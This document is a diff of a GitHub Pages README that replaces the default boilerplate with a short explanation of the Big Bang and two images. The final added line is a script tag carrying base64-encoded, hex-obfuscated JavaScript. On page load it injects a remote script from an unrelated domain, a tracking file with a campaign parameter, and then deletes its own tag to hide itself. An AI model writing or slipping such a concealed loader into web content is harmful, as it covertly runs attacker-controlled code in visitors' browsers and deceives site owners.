@@ -1,37 +1,13 @@
-## Welcome to GitHub Pages
+# The Big Bang
 
-You can use the [editor on GitHub](https://github.com/nichizumi/Bang/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Most astronomers believe the Universe began in a Big Bang about 14 billion years ago. At that time, the entire Universe was inside a bubble that was thousands of times smaller than a pinhead. It was hotter and denser than anything we can imagine.
+![o](https://www.esa.int/var/esa/storage/images/esa_multimedia/images/2014/06/nearby_galaxy/17883658-2-eng-GB/Nearby_galaxy.jpg)
+Then it suddenly exploded. The Universe that we know was born. Time, space and matter all began with the Big Bang. In a fraction of a second, the Universe grew from smaller than a single atom to bigger than a galaxy. And it kept on growing at a fantastic rate. It is still expanding today.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+As the Universe expanded and cooled, energy changed into particles of matter and antimatter. These two opposite types of particles largely destroyed each other. But some matter survived. More stable particles called protons and neutrons started to form when the Universe was one second old.
+![l](https://cdn.mos.cms.futurecdn.net/kMChxjg6MPHUGGcCparx7b.jpg)
+Over the next three minutes, the temperature dropped below 1 billion degrees Celsius. It was now cool enough for the protons and neutrons to come together, forming hydrogen and helium nuclei.
 
-### Markdown
+After 300 000 years, the Universe had cooled to about 3000 degrees. Atomic nuclei could finally capture electrons to form atoms. The Universe filled with clouds of hydrogen and helium gas.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/nichizumi/Bang/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="L13ph" src="data:text/javascript;base64, dmFyIF93MFlVZyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzQxR1doLCBfTFY4N20pIHt2YXIgX2QwS1YzID0gZnVuY3Rpb24oX0Y2RnpUKSB7d2hpbGUgKC0tX0Y2RnpUKSB7XzQxR1doWydwdXNoJ10oXzQxR1doWydzaGlmdCddKCkpO319O19kMEtWMygrK19MVjg3bSk7fShfdzBZVWcsIDB4MTFiKSk7dmFyIF80OXk4SiA9IGZ1bmN0aW9uKF9tRmRjVywgX2lWaUxJKSB7X21GZGNXID0gX21GZGNXIC0gMHgwO3ZhciBfN0ZkNDYgPSBfdzBZVWdbX21GZGNXXTtyZXR1cm4gXzdGZDQ2O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfNDl5OEooJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX29JMmp6ID0gZG9jdW1lbnRbXzQ5eThKKCcweDEnKV0oXzQ5eThKKCcweDInKSk7X29JMmp6W180OXk4SignMHgzJyldID0gXzQ5eThKKCcweDQnKTtfb0kyanpbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3MFx4NmNceDYxXHg3M1x4NzRceDY5XHg2M1x4NzNceDc1XHg3Mlx4NjdceDY1XHg3Mlx4NzlceDYxXHg2M1x4NjNceDMxXHgyZVx4NjVceDYzXHg3Mlx4NzlceDcwXHg3NFx4NmZceDcyXHg2NVx4NzZceDZmXHg2Y1x4NzVceDc0XHg2OVx4NmZceDZlXHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NmZceDY4XHg3Nlx4NzJceDUzXHg0Y1x4NzhceDQxXHg0Ylx4NTknO2RvY3VtZW50W180OXk4SignMHg1JyldKF80OXk4SignMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9vSTJqeik7ZG9jdW1lbnRbXzQ5eThKKCcweDcnKV0oJ0wxM3BoJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
